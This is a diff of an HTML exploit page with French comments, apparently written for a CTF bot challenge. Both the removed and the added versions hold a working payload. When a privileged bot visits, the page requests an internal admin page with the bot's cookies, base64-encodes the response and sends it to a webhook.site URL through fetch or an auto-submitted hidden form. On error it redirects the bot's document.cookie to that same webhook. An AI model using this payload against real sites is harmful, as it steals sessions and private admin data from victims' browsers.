@@ -1,25 +1,30 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Exploit</title>
-</head>
 <body>
+    <h1>Chargement en cours...</h1>
+    <form id="exploitForm" action="https://webhook.site/acaf3170-8841-43f5-ae68-66bf0533b010" method="POST">
+        <input type="hidden" name="admin_content" id="admin_content">
+    </form>
+
     <script>
-        // Le bot arrive ici. On lance la requête vers l'admin du CTF.
-        fetch('http://192.168.132.208:9223/admin')
-            .then(response => response.text())
-            .then(data => {
-                // On t'envoie le résultat sur ton webhook
-                fetch('https://webhook.site/acaf3170-8841-43f5-ae68-66bf0533b010', {
-                    method: 'POST',
-                    mode: 'no-cors', // Pour éviter les blocages de sécurité simples
-                    body: btoa(data) // On encode en base64 pour ne rien perdre
-                });
-            })
-            .catch(err => {
-                // Si ça rate, on envoie l'erreur pour savoir pourquoi
-                location.href = 'https://webhook.site/acaf3170-8841-43f5-ae68-66bf0533b010?error=' + btoa(err);
-            });
+        // On essaie de récupérer la page admin
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "http://192.168.132.208:9223/admin", true);
+        xhr.withCredentials = true; // Très important pour envoyer les cookies du bot
+        
+        xhr.onload = function() {
+            // On met le code source de l'admin dans le formulaire
+            document.getElementById('admin_content').value = btoa(xhr.responseText);
+            // On envoie le formulaire automatiquement vers ton webhook
+            document.getElementById('exploitForm').submit();
+        };
+
+        xhr.onerror = function() {
+            // Si le GET échoue (CORS), on tente une redirection directe avec le cookie
+            location.href = "https://webhook.site/acaf3170-8841-43f5-ae68-66bf0533b010?cookie=" + document.cookie;
+        };
+
+        xhr.send();
     </script>
 </body>
 </html>
